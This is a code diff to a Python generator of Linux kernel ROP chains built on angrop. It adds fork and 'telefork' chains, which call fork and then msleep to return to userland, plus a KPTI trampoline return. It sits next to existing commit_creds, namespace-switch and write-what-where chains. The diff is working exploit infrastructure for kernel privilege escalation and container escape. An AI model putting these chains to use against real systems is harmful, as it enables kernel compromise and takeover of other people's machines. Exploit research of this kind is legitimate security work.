@@ -27,7 +27,7 @@ KPTI_TRAMPOLINE = "swapgs_restore_regs_and_return_to_usermode"
 INIT_NSPROXY = "init_nsproxy"
 CORE_PATTERN = "core_pattern"
 MSLEEP = "msleep"
-FORK = "__do_sys_vfork"
+FORK = "__do_sys_fork"
 RPP_CONTEXT_SIZE = 5
 
 ROP_C_FORMAT = "*(rop++) = {};"
@@ -79,7 +79,9 @@ class RopGeneratorAngrop:
         self._rop = self._load_angrop()
 
     def _find_symbol_addr(self, func_name):
-        return self._symbol_map.get(func_name)
+        if not func_name in self._symbol_map:
+            raise RopGeneratorError(f"Could not find a symbol for {func_name}")
+        return self._symbol_map[func_name]
 
     def _find_symbol(self, func_name):
         return RopChainOffset(self._find_symbol_addr(func_name) - KERNEL_BASE_ADDRESS)
@@ -362,7 +364,27 @@ class RopGeneratorAngrop:
         ])
 
     def rop_action_fork(self):
+        """Constructs a fork rop chain.
+
+        Returns:
+            RopChain: The constructed ROP chain.
+        """
         return RopChain([self._find_symbol(FORK)])
+
+    def rop_action_telefork(self, msecs: RopChainConstant | RopChainArgument):
+        """Constructs a telefork rop chain.
+        Used to return to userland from kernel
+
+        Returns:
+            RopChain: The constructed ROP chain.
+        """
+        items = [self._find_symbol(FORK),
+                 RopChainOffset(self._find_pop_one_reg("rdi")),
+                 msecs,
+                 self._find_symbol(MSLEEP),
+                ]
+
+        return RopChain(items)
 
     def rop_action_write_what_where_64(self, address, value):
         """Constructs a rop chain to write a 64 bit value to an address.
@@ -401,13 +423,20 @@ if __name__ == "__main__":
     action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces(RopChainArgument(0))
     action_write_what_where_64 = rop_generator.rop_action_write_what_where_64(
         RopChainArgument(0), RopChainArgument(1))
+    action_fork = rop_generator.rop_action_fork()
+    action_telefork = rop_generator.rop_action_telefork(RopChainArgument(0))
+    action_trampoline_ret = rop_generator.rop_action_ret_via_kpti_retpoline(RopChainArgument(
+        0), RopChainArgument(1), RopChainArgument(2), RopChainArgument(3), RopChainArgument(4))
 
     if args.output == "json":
         print(RopActionSerializer.serialize({
             0x01: action_sleep,
             0x02: action_commit_creds,
             0x03: action_switch_task_namespace,
-            0x04: action_write_what_where_64
+            0x04: action_write_what_where_64,
+            0x05: action_fork,
+            0x06: action_telefork,
+            0x07: action_trampoline_ret,
         }, args.json_indent))
     else:
         chain = rop_generator.build_rop_chain()
@@ -420,3 +449,5 @@ if __name__ == "__main__":
               repr(action_switch_task_namespace) + '\n\n')
         print("Write What Where (64 bits)\n" +
               repr(action_write_what_where_64) + '\n\n')
+        print("Fork\n" + repr(action_fork) + '\n\n')
+        print("Telefork\n" + repr(action_telefork) + '\n\n')
